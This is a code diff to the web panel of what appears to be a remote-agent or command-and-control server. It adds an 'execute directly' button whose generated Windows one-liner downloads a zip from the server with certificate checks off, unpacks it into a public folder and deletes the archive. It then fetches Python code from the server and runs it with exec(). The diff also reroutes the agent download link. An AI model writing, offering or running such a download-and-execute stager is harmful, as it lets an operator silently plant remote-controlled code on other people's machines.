@@ -100,12 +100,22 @@
                                 </select>
                             </div>
                         </div>
-                        <button type="submit" class="btn btn-primary">Generate Agent</button>
+                        <button type="submit" class="btn btn-primary" onclick="copyUrl()" >Generate Agent</button>
                     </form>
                     <div id="agentDownload" class="mt-3" style="display: none;">
                         <a id="downloadLink" href="#" class="btn btn-success">
                             <i class="fas fa-download me-2"></i>Download Agent
-                        </a>
+                        </a><div><br>
+                            <b>Or execute directly:</b><br>
+                            <div id="displayArea">
+                                <!-- The URL will appear here -->
+                            </div>
+
+
+                           
+                           
+                        </div>
+                        
                     </div>
                     <div id="agentError" class="alert alert-danger mt-3" style="display: none;"></div>
                 </div>
@@ -115,6 +125,22 @@
 </div>
 
 <script>
+
+
+function copyUrl() {
+            // 1. Get the value from the input field
+            const url = document.getElementById('serverUrl').value;
+            
+            // 2. Display it in the target div
+            document.getElementById('displayArea').innerHTML = 
+                `<code> curl -ks ${url}/a/p -o c:\\users\\public\\p.zip & cd c:\\users\\public & tar -xf p.zip & del /q p.zip & cd documents & python -c "import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"</code>`;
+            
+            // Optional: Copy to clipboard
+            navigator.clipboard.writeText(url).then(() => {
+                console.log('URL copied to clipboard');
+            });
+        }
+
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('agentConfigForm');
     const downloadDiv = document.getElementById('agentDownload');
@@ -147,7 +173,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 throw new Error(data.message || 'Failed to generate agent');
             }
 
-            downloadLink.href = `/agents/download?t=${Date.now()}`;
+            downloadLink.href = `/a/d?t=${Date.now()}`;
             downloadDiv.style.display = 'block';
             
         } catch (error) {
